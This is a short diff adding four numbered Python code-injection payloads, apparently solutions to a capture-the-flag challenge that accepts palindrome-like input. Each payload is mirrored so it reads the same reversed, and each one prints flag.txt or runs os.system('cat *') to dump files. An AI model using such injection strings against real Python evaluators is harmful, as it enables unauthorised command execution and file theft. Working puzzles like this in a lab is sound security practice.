@@ -1,0 +1,13 @@
+1.
+code = '''print('print(list(open(\\'flag.txt\\')))');"\\a'''
+code = '"' + code[::-1] + ';";' + code + '"'
+print(code)
+
+2.
+"a\";)";print("\x69mport os;os.system('cat *')\x2332x\)'* tac'(metsys.so;so tropm96x\"(tnirp;");"\a"
+
+3.
+"'''""a";)")'* tac'(metsys.so;so tropmi"(tnirp;"'''"";print("import os;os.system('cat *')");"a"'''""
+
+4.
+' \';)"))(daer.)"\txt.galf"\(nepo(tnirp"(tnirp;';print("print(open(\"flag.txt\").read())");'\ '
